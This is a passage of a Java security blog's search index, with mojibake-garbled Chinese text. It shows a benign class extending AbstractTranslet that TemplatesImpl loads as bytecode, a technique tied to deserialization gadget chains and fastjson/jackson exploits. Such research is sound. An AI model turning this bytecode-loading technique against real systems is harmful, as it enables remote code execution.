class="line">import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; </span><br><span class="line">import com.sun.org.apache.xml.internal.serializer.SerializationHandler; </span><br><span class="line">public class HelloTemplatesImpl extends AbstractTranslet &#123; </span><br><span class="line">public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;&#125; </span><br><span class="line">public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;&#125; </span><br><span class="line">public HelloTemplatesImpl() &#123; </span><br><span class="line">super();</span><br><span class="line">System.out.println(&quot;Hello TemplatesImpl&quot;); </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®ƒç»§æ‰¿äº† AbstractTranslet ç±»ï¼Œå¹¶åœ¨æ„é€ å‡½æ•°é‡Œæ’å…¥Helloçš„è¾“å‡ºã€‚å°†å…¶ç¼–è¯‘æˆå­—èŠ‚ç ï¼Œå³å¯è¢« TemplatesImpl æ‰§è¡Œäº†ï¼š<br><img src="/2023/05/16/JAVA%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/9.png" alt="one"></p><p>å®æµ‹ jdk 66 æ— æ³•æ‰§è¡Œï¼Œ è€Œjdk 321 å¯ä»¥ ï¼Œåœ¨å¤šä¸ªJavaååºåˆ—åŒ–åˆ©ç”¨é“¾ï¼Œä»¥åŠfastjsonã€jacksonçš„æ¼æ´ä¸­ï¼Œéƒ½æ›¾å‡ºç°è¿‡ TemplatesImpl çš„èº«å½±ï¼Œè¿™ ä¸ªç³»åˆ—åæ–‡ä¸­ä»ç„¶ä¼šå†æ¬¡è§åˆ°å®ƒçš„èº«å½±ã€‚</p><h1 id="åˆ©ç”¨BCEL-ClassLoaderåŠ è½½å­—èŠ‚ç "><a href="#åˆ©ç”¨BCEL-ClassLoaderåŠ è½½å­—èŠ‚ç " class="headerlink" title="åˆ©ç”¨BCEL ClassLoaderåŠ è½½å­—èŠ‚ç "></a>åˆ©ç”¨BCEL ClassLoaderåŠ è½½å­—èŠ‚ç </h1><p>å¯ä»¥å…ˆå‚è€ƒ p ç¥çš„ [BCEL Cassloader](<a href="https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html">BCEL ClassLoaderå»å“ªäº† | ç¦»åˆ«æ­Œ (leavesongs.com)</a>)</p>]]></content>
      
      
      <categories>
          
          <category> JAVAå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JAVA </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
